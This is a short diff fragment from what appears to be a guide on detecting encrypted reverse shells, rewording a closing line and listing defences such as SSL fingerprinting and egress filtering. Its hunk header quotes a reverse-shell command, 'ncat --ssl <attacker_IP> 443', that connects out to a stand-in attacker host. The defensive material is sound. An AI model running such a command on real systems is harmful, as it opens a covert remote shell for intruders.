@@ -151,4 +151,4 @@ ncat --ssl <attacker_IP> 443
 - Combine **network signatures**, **host-based telemetry**, and **SSL fingerprinting** for robust detection.  
 - Use **deception** and **egress filtering** to disrupt adversaries.  
 
-Let me know if you want to dive deeper into specific tactics (e.g., DNS tunneling, ICMP covert channels)! 🔍
+Additional tactics can include: DNS tunneling and ICMP covert channels.
